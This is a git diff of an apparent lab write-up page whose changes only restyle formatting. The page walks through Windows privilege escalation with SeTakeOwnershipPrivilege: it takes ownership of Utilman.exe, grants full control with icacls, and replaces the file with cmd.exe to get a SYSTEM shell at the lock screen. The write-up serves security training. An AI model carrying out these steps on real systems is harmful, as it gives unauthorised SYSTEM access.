@@ -12,7 +12,7 @@ sidebar_position: 2
 <br/>
 
 
-- <b style={{ color: 'Red' }}>[NOTE]</b> The Command Prompt needs to be open as <b style={{ color: 'Red' }}>Administrator</b>
+- <b style={{ color: 'Red' }}>[NOTE]</b> The <span style={{fontWeight: 'Bold'}}>Command Prompt</span> needs to be open as <b style={{ color: 'Red' }}>Administrator</b>
 
 ```log
 C:\> whoami /priv
@@ -26,11 +26,11 @@ Privilege Name                Description                              State
 SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
 ```
 
-<br/>
+<br/> 
 
-- Abusing `Utilman.exe` to Escalate Privileges **(Utilman is a Built-In Windows Application used to provide Ease of Access options during the Lock Screen).**
+- Abusing <b style={{ color: 'MediumTurquoise' }}>Utilman.exe</b> to Escalate Privileges **(Utilman is a Built-In Windows Application used to provide Ease of Access options during the Lock Screen).**
 - **`Utilman`** is run with `SYSTEM` Privileges, we will effectively gain **SYSTEM** Privileges if we `[Replace the Original Binary]` for any PAYLOAD.
-- Taking Ownership of `Utilman.exe`
+- Taking Ownership of <b style={{ color: 'MediumTurquoise' }}>Utilman.exe</b>
 
 ```log
 C:\> takeown /f C:\Windows\System32\Utilman.exe
@@ -39,7 +39,7 @@ SUCCESS: The file (or folder): "C:\Windows\System32\Utilman.exe" now owned by us
 
 <br/>
 
-- Giving User Full Permissions <b style={{ color: 'PowderBlue' }}>THMTakeOwnership:(F)</b> over `Utilman.exe`
+- Giving User Full Permissions <b style={{ color: 'DeepSkyBlue' }}>THMTakeOwnership:(F)</b> over <b style={{ color: 'MediumTurquoise' }}>Utilman.exe</b>
 
 ```log
 C:\> icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
@@ -48,7 +48,7 @@ C:\> icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
 
 <br/>
 
-- Replacing `Utilman.exe` with a copy of `cmd.exe`
+- Replacing <b style={{ color: 'MediumTurquoise' }}>Utilman.exe</b> with a copy of `cmd.exe`
 
 ```log
 C:\Windows\System32\> copy cmd.exe utilman.exe
